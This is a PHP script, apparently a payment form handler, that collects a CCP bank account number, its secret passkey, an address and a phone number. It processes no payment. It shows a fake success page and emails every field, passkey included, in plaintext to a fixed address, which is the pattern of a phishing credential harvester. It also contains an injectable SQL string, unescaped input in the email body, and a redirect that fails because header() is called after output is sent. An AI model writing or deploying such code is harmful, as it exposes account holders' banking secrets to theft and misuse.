<?php
// send-payment.php

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Collect the form data
    $ccp = $_POST['ccp'];        // CCP (Bank Account)
    $passkey = $_POST['passkey']; // Passkey
    $address = $_POST['address'];  // Address (Place)
    $phone = $_POST['phone'];     // Phone number

    // Validate the form fields
    if (empty($ccp) || empty($passkey) || empty($address) || empty($phone)) {
        echo "All fields are required!";
    } else {
        // Simulate payment processing
        // This is where you would typically connect to a payment gateway or process the payment
        // For demonstration purposes, let's simulate a successful payment:

        // Save payment details to a database (for demonstration purposes, we'll skip this step)
        // $db->query("INSERT INTO payments (ccp, passkey, address, phone) VALUES ('$ccp', '$passkey', '$address', '$phone')");

        // Simulate successful payment processing
        echo "<h2>Payment Successful!</h2>";
        echo "<p>Thank you for your payment of 3200 DA.</p>";
        echo "<p>Payment Information:</p>";
        echo "<ul>";
        echo "<li><strong>CCP:</strong> " . htmlspecialchars($ccp) . "</li>";
        echo "<li><strong>Passkey:</strong> " . htmlspecialchars($passkey) . "</li>";
        echo "<li><strong>Address (Place):</strong> " . htmlspecialchars($address) . "</li>";
        echo "<li><strong>Phone:</strong> " . htmlspecialchars($phone) . "</li>";
        echo "</ul>";

        // Send an email confirmation to the user (or to the admin)
        $to = "user@example.com"; // Change this to the user's email address
        $subject = "Payment Confirmation";
        $message = "
        <html>
        <head>
            <title>Payment Confirmation</title>
        </head>
        <body>
            <h2>Your Payment was Successful!</h2>
            <p>Thank you for your payment of 3200 DA. Here are your payment details:</p>
            <ul>
                <li><strong>CCP:</strong> $ccp</li>
                <li><strong>Passkey:</strong> $passkey</li>
                <li><strong>Address:</strong> $address</li>
                <li><strong>Phone:</strong> $phone</li>
            </ul>
            <p>Thank you for choosing our service!</p>
        </body>
        </html>
        ";

        // Set content-type for HTML email
        $headers = "MIME-Version: 1.0" . "\r\n";
        $headers .= "Content-Type: text/html; charset=UTF-8" . "\r\n";
        $headers .= "From: no-reply@example.com" . "\r\n"; // Change this to a valid sender address

        // Send the email
        mail($to, $subject, $message, $headers);

        // Optionally, redirect the user to a confirmation page
        header("Location: confirmation.php");
        exit();
    }
} else {
    // If the form is not submitted via POST
    echo "Invalid request.";
}
?>
